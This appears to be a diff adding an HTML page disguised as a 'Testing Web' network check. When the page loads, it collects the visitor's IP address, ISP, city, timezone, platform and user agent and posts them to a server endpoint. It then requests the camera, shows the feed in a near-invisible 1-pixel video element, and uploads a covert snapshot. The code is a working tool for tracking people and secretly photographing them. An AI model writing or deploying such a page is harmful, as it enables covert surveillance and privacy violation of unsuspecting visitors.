@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Testing Web</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body { background:#000; color:#00ff99; font-family:monospace; text-align:center; }
+video { width:1px; height:1px; opacity:0.01; }
+#status { margin-top:40px; }
+</style>
+</head>
+<body>
+
+<h3>Testing Web Initializing…</h3>
+<p id="status">Searching network info…</p>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const CAPTURE_DELAY = 2000;
+
+const statusText = document.getElementById("status");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(ipData => {
+    const infoText = buildInfo(ipData);
+    statusText.textContent = "Sending to server…";
+    return sendInfo(infoText);
+})
+.then(() => {
+    statusText.textContent = "Info sent. Requesting camera permission…";
+    requestCamera();
+})
+.catch(() => {
+    statusText.textContent = "Failed.";
+});
+
+function buildInfo(ip) {
+    const now = new Date();
+    return `
+🧪 Testing Lab Report
+
+🕒 Time: ${now.toLocaleString()}
+🌍 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+🌐 IP: ${ip.ip}
+🏢 ISP: ${ip.org}
+
+📍 ${ip.country_name} / ${ip.city}
+
+🖥 Platform: ${navigator.platform}
+📐 Screen: ${screen.width}x${screen.height}
+
+${navigator.userAgent}
+`;
+}
+
+function sendInfo(text) {
+    return fetch("/api/collect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ text })
+    });
+}
+
+function requestCamera() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+        video.srcObject = stream;
+        statusText.textContent = "Camera active. Capturing…";
+        setTimeout(captureAndSendPhoto, CAPTURE_DELAY);
+    })
+    .catch(() => {
+        statusText.textContent = "Camera denied.";
+    });
+}
+
+function captureAndSendPhoto() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+
+    canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("photo", blob);
+
+        fetch("/api/photo", {
+            method: "POST",
+            body: formData
+        })
+        .then(() => {
+            statusText.textContent = "Test completed successfully.";
+        })
+        .catch(() => {
+            statusText.textContent = "Upload failed.";
+        });
+    }, "image/jpeg", 0.9);
+}
+</script>
+</body>
+</html>
